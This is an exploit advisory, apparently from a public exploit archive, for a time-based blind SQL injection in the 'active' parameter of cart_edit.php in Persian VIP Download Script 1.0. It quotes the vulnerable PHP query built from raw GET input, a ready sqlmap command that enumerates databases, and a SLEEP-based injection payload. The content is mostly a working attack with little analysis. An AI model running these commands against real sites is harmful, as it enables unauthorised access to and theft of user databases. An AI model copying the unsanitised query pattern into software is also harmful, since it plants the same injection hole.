@@ -1,0 +1,37 @@
+# Exploit Title: Persian VIP Download Script 1.0 - 'active' SQL Injection
+# Data: 2020-03-09
+# Exploit Author: S3FFR
+# Vendor HomagePage: http://download.freescript.ir/scripts/Persian-VIP-Download(FreeScript.ir).zip
+# Version: = 1.0 [Final Version]
+# Tested on: Windows,Linux
+# Google Dork: N/A
+
+
+=======================
+Vulnerable Page:
+
+/cart_edit.php
+
+=======================
+
+Vulnerable Source:
+
+89: mysql_query $user_p = mysql_fetch_array(mysql_query("SELECT * FROM `users` where id='$active'")); 
+71: $active = $_GET['active']; 
+
+======================
+sqlmap:
+
+sqlmap -u "http://target.com/cart_edit.php?active=1" -p active --cookie=[COOKIE] --technique=T --dbs
+=======================
+
+Testing Method :
+	
+	- time-based blind
+
+Parameter: active (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: active=1' AND (SELECT 4169 FROM (SELECT(SLEEP(5)))wAin) AND 'zpth'='zpth
+
+========================
